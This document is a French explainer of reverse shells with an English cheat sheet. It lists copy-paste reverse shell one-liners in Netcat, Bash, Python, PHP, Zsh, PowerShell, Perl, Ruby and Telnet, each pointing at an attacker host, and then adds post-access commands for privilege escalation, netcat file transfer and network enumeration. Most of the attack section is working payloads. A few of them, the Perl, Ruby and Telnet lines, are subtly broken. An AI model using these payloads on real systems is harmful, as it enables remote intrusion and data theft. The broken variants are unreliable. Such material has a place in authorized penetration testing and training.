Qu'est-ce qu'un shell inversé ?

Un shell inversé est un type de shell dans lequel la machine cible initie une connexion vers la machine de l'attaquant, permettant ainsi à l'attaquant d'exécuter des commandes à distance sur la machine cible. Les shells inversés sont couramment utilisés dans les tests de pénétration et d'autres tâches liées à la sécurité, car ils permettent à un attaquant d'obtenir un accès à distance à un système sans nécessiter d'interaction de l'utilisateur ou de configuration réseau.

Pour établir un shell inversé, l'attaquant crée généralement une charge utile de shell, qui est un petit programme ou script conçu pour établir une connexion vers la machine de l'attaquant. Cette charge utile est ensuite téléchargée sur la machine cible, soit par le biais d'une vulnérabilité, soit en trompant l'utilisateur pour qu'il l'exécute. Une fois la charge utile exécutée, elle établit une connexion vers la machine de l'attaquant, créant une session de shell qui peut être utilisée pour exécuter des commandes sur la machine cible.

Comment fonctionne un shell inversé ?

Un shell inversé fonctionne en établissant une connexion entre la machine cible et la machine de l'attaquant. Cette connexion est généralement initiée par la machine cible, qui envoie une requête à la machine de l'attaquant pour établir une connexion. Une fois la connexion établie, la machine de l'attaquant agit comme un écouteur, attendant les commandes envoyées par l'attaquant.

Pour créer un shell inversé, l'attaquant doit d'abord créer une charge utile de shell conçue pour se connecter à la machine de l'attaquant. Cela peut être fait en utilisant une variété d'outils et de langages de programmation, tels que Netcat, Python ou Metasploit. Une fois la charge utile créée, elle est généralement téléchargée sur la machine cible en utilisant une vulnérabilité ou des tactiques d'ingénierie sociale.

Une fois la charge utile exécutée sur la machine cible, elle établit une connexion vers la machine de l'attaquant. Cette connexion peut être chiffrée pour éviter la détection et peut utiliser divers protocoles, tels que TCP, UDP ou HTTP. Une fois la connexion établie, l'attaquant peut utiliser la session de shell pour exécuter des commandes sur la machine cible, accéder aux fichiers et aux données, et même escalader les privilèges si nécessaire.

Pourquoi les shells inversés sont-ils utilisés ?

Les shells inversés sont couramment utilisés dans les tests de pénétration et d'autres tâches liées à la sécurité car ils fournissent un moyen d'obtenir un accès à distance à un système sans nécessiter d'interaction de l'utilisateur ou de configuration réseau. Les shells inversés peuvent être utilisés pour tester la sécurité d'un système, identifier des vulnérabilités et effectuer divers types d'attaques, telles que le vol de données, la modification de fichiers ou l'exécution de logiciels malveillants.

Les shells inversés sont également couramment utilisés dans les activités post-exploitation, car ils permettent à un attaquant de maintenir l'accès à un système même si la vulnérabilité ou l'exploit initial est corrigé. En établissant un shell inversé sur un système compromis, un attaquant peut continuer à surveiller le système, exfiltrer des données, ou même lancer des attaques supplémentaires sur d'autres systèmes au sein du réseau.


LES DIFFERENTS TYPES DE REVERSES
--------------------------------

Netcat
------
nc -e /bin/sh <attacker IP> <attacker port>

Bash
-----
bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1

Python
-------
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker IP>",<attacker port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

PHP
----
php -r '$sock=fsockopen("<attacker IP>",<attacker port>);exec("/bin/sh -i <&3 >&3 2>&3");'

ZSH
----
zsh -c 'zmodload zsh/net/tcp && ztcp <attacker IP> <attacker port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

Powershell
----------
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker IP>',<attacker port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Perl
-----
perl -e 'use Socket;$i="$ENV{<attacker IP>}";$p=$ENV{<attacker port>};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Ruby
----
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["<attacker IP>"],ENV["<attacker port>"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

Telnet
------
TF=$(mktemp -u); mkfifo $TF && telnet <attacker IP> <attacker port> 0<$TF | /bin sh 1>$TF



	Basic Commands

    pwd: Print current working directory.
    ls: List contents of current directory.
    cd: Change current directory.
    cat: Display contents of a file.
    rm: Remove a file or directory.
    mkdir: Create a new directory.
    cp: Copy a file or directory.
    mv: Move a file or directory.


   Privilege Escalation

    sudo -l: List available sudo commands for the current user.
    sudo <command>: Run a command with elevated privileges.
    su: Switch to the root user.
    sudo su: Switch to the root user with elevated privileges.


    File Transfer

    wget <file URL>: Download a file from the internet.
    curl <file URL>: Download a file from the internet.
    nc -l <local port> > <file>: Receive a file over the network using netcat.
    nc <target IP> <target port> < <file>: Send a file over the network using netcat.


    Network Enumeration

    ifconfig: Display network interface information.
    netstat -tulpn: List active network connections.
    arp -a: Display ARP table.
    ping <target IP>: Test network connectivity to a target.
    nmap: Scan a network for open ports and services.